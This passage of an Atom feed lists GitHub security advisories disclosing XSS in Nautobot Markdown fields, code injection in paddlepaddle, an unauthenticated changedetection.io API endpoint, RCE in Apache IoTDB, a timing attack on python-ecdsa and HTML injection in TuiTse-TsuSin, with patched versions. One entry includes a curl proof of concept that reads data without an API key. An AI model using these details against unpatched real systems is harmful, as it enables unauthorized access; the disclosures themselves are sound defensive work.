<li><code>ProviderNetwork.comments</code></li>
<li><code>Rack.comments</code></li>
<li><code>Tenant.comments</code></li>
<li><code>VirtualMachine.comments</code></li>
<li>Contents of any custom fields of type <code>markdown</code></li>
<li>Job class <code>description</code> attributes</li>
<li>The <code>SUPPORT_MESSAGE</code> system configuration setting</li>
</ul>
<p>are potentially susceptible to cross-site scripting (XSS) attacks via maliciously crafted data.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in Nautobot versions 1.6.10 and 2.1.2.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/nautobot/nautobot/pull/5133">https://github.com/nautobot/nautobot/pull/5133</a>
<a href="https://github.com/nautobot/nautobot/pull/5134">https://github.com/nautobot/nautobot/pull/5134</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h">https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23345">https://nvd.nist.gov/vuln/detail/CVE-2024-23345</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5133">https://github.com/nautobot/nautobot/pull/5133</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5134">https://github.com/nautobot/nautobot/pull/5134</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80">https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce">https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce</a></li>
<li><a href="https://github.com/advisories/GHSA-v4xv-795h-rv4h">https://github.com/advisories/GHSA-v4xv-795h-rv4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4xv-795h-rv4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-23T14:44:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot] XSS potential in rendered Markdown fields (comments, description, notes, etc.)]]></title>
        <id>https://github.com/advisories/GHSA-v4xv-795h-rv4h</id>
        <link href="https://github.com/advisories/GHSA-v4xv-795h-rv4h"/>
        <updated>2024-01-23T14:44:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All users of Nautobot versions earlier than 1.6.10 or 2.1.2 are potentially impacted.</p>
<p>Due to inadequate input sanitization, any user-editable fields that support Markdown rendering, including:</p>
<ul>
<li><code>Circuit.comments</code></li>
<li><code>Cluster.comments</code></li>
<li><code>CustomField.description</code></li>
<li><code>Device.comments</code></li>
<li><code>DeviceRedundancyGroup.comments</code></li>
<li><code>DeviceType.comments</code></li>
<li><code>Job.description</code></li>
<li><code>JobLogEntry.message</code></li>
<li><code>Location.comments</code></li>
<li><code>Note.note</code></li>
<li><code>PowerFeed.comments</code></li>
<li><code>Provider.noc_contact</code></li>
<li><code>Provider.admin_contact</code></li>
<li><code>Provider.comments</code></li>
<li><code>ProviderNetwork.comments</code></li>
<li><code>Rack.comments</code></li>
<li><code>Tenant.comments</code></li>
<li><code>VirtualMachine.comments</code></li>
<li>Contents of any custom fields of type <code>markdown</code></li>
<li>Job class <code>description</code> attributes</li>
<li>The <code>SUPPORT_MESSAGE</code> system configuration setting</li>
</ul>
<p>are potentially susceptible to cross-site scripting (XSS) attacks via maliciously crafted data.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in Nautobot versions 1.6.10 and 2.1.2.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/nautobot/nautobot/pull/5133">https://github.com/nautobot/nautobot/pull/5133</a>
<a href="https://github.com/nautobot/nautobot/pull/5134">https://github.com/nautobot/nautobot/pull/5134</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h">https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23345">https://nvd.nist.gov/vuln/detail/CVE-2024-23345</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5133">https://github.com/nautobot/nautobot/pull/5133</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5134">https://github.com/nautobot/nautobot/pull/5134</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80">https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce">https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce</a></li>
<li><a href="https://github.com/advisories/GHSA-v4xv-795h-rv4h">https://github.com/advisories/GHSA-v4xv-795h-rv4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4xv-795h-rv4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-23T14:44:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[paddlepaddle] Code Injection in paddlepaddle]]></title>
        <id>https://github.com/advisories/GHSA-chj7-w3f6-cvfj</id>
        <link href="https://github.com/advisories/GHSA-chj7-w3f6-cvfj"/>
        <updated>2024-01-23T14:41:51.000Z</updated>
        <content type="html"><![CDATA[<p>The vulnerability arises from the way the url parameter is incorporated into the command string without proper validation or sanitization. If the url is constructed from untrusted sources, an attacker could potentially inject malicious commands.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0521">https://nvd.nist.gov/vuln/detail/CVE-2024-0521</a></li>
<li><a href="https://huntr.com/bounties/a569c64b-1e2b-4bed-a19f-47fd5a3da453">https://huntr.com/bounties/a569c64b-1e2b-4bed-a19f-47fd5a3da453</a></li>
<li><a href="https://github.com/advisories/GHSA-chj7-w3f6-cvfj">https://github.com/advisories/GHSA-chj7-w3f6-cvfj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chj7-w3f6-cvfj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-20T21:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] changedetection.io API endpoint is not secured with API token]]></title>
        <id>https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</id>
        <link href="https://github.com/advisories/GHSA-hcvp-2cc7-jrwr"/>
        <updated>2024-01-27T00:31:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>API endpoint <code>/api/v1/watch/&lt;uuid&gt;/history</code> can be accessed by any unauthorized user.</p>
<h3 id="details">Details</h3>
<p>WatchHistory resource does not have <code>@auth.check_token</code> annotation, which means it can be accessed without providing <code>x-api-key</code> header.</p>
<p><a href="https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Get list of watch with <code>x-api-key</code>:</li>
</ol>
<pre><code class="language-sh">$ curl -H "x-api-key: apikeyhere" http://localhost:5000/api/v1/watch
{"uuid": ...}
</code></pre>
<ol start="2">
<li>Call for history of snapshots without <code>x-api-key</code>. Expected - 401/403 error. Actual - list of snapshots is listed.</li>
</ol>
<pre><code class="language-sh">$ curl http://localhost:5000/api/v1/watch/uuid/history
{"timestamp": "/path/to/snapshot.txt"}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Anybody can check one's watch history. However, because unauthorized party first needs to know watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23329">https://nvd.nist.gov/vuln/detail/CVE-2024-23329</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f">https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-hcvp-2cc7-jrwr">https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-23T12:50:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-iotdb] Remote Code Execution vulnerability in Apache IoTDB via UDF]]></title>
        <id>https://github.com/advisories/GHSA-rxgg-273w-rfw7</id>
        <link href="https://github.com/advisories/GHSA-rxgg-273w-rfw7"/>
        <updated>2024-01-23T00:31:55.000Z</updated>
        <content type="html"><![CDATA[<p>Remote Code Execution vulnerability in Apache IoTDB.This issue affects Apache IoTDB: from 1.0.0 through 1.2.2.</p>
<p>Users are recommended to upgrade to version 1.3.0, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46226">https://nvd.nist.gov/vuln/detail/CVE-2023-46226</a></li>
<li><a href="https://lists.apache.org/thread/293b4ob65ftnfwyf62fb9zh8gwdy38hg">https://lists.apache.org/thread/293b4ob65ftnfwyf62fb9zh8gwdy38hg</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/15/1">http://www.openwall.com/lists/oss-security/2024/01/15/1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2024-11.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2024-11.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-rxgg-273w-rfw7">https://github.com/advisories/GHSA-rxgg-273w-rfw7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rxgg-273w-rfw7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-15T12:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ecdsa] Minerva timing attack on P-256 in python-ecdsa]]></title>
        <id>https://github.com/advisories/GHSA-wj6h-64fc-37mp</id>
        <link href="https://github.com/advisories/GHSA-wj6h-64fc-37mp"/>
        <updated>2024-01-23T00:31:50.000Z</updated>
        <content type="html"><![CDATA[<p>python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the <code>ecdsa.SigningKey.sign_digest()</code> API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-wj6h-64fc-37mp">https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-wj6h-64fc-37mp</a></li>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/blob/master/SECURITY.md">https://github.com/tlsfuzzer/python-ecdsa/blob/master/SECURITY.md</a></li>
<li><a href="https://minerva.crocs.fi.muni.cz/">https://minerva.crocs.fi.muni.cz/</a></li>
<li><a href="https://securitypitfalls.wordpress.com/2018/08/03/constant-time-compare-in-python/">https://securitypitfalls.wordpress.com/2018/08/03/constant-time-compare-in-python/</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23342">https://nvd.nist.gov/vuln/detail/CVE-2024-23342</a></li>
<li><a href="https://github.com/advisories/GHSA-wj6h-64fc-37mp">https://github.com/advisories/GHSA-wj6h-64fc-37mp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wj6h-64fc-37mp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-22T21:35:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[TuiTse-TsuSin] html injection vulnerability in the `tuitse_html` function.]]></title>
        <id>https://github.com/advisories/GHSA-m4m5-j36m-8x72</id>
        <link href="https://github.com/advisories/GHSA-m4m5-j36m-8x72"/>
        <updated>2024-01-23T18:42:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When using <code>tuitse_html</code> without quoting the input, there is a html injection vulnerability. It should use the django version <code>django.utils.html.format_html</code>, instead of <code>string.format()</code></p>
<h3 id="patches">Patches</h3>
<p>Upgrade to version 1.3.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitizing Taigi input with HTML quotation.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/i3thuan5/TuiTse-TsuSin/pull/22">https://github.com/i3thuan5/TuiTse-TsuSin/pull/22</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/i3thuan5/TuiTse-TsuSin/security/advisories/GHSA-m4m5-j36m-8x72">https://github.com/i3thuan5/TuiTse-TsuSin/security/advisories/GHSA-m4m5-j36m-8x72</a></li>
<li><a href="https://github.com/i3thuan5/TuiTse-TsuSin/pull/22">https://github.com/i3thuan5/TuiTse-TsuSin/pull/22</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23341">https://nvd.nist.gov/vuln/detail/CVE-2024-23341</a></li>
<li><a href="https://github.com/i3thuan5/TuiTse-TsuSin/commit/9d21d99d7cfcd7c42aade251fab98ec102e730ea">https://github.com/i3thuan5/TuiTse-TsuSin/commit/9d21d99d7cfcd7c42aade251fab98ec102e730ea</a></li>
<li><a href="https://github.com/advisories/GHSA-m4m5-j36m-8x72">https://github.com/advisories/GHSA-m4m5-j36m-8x72</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4m5-j36m-8x72</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-22T21:32:52.000Z</published>
    </entry>
</feed>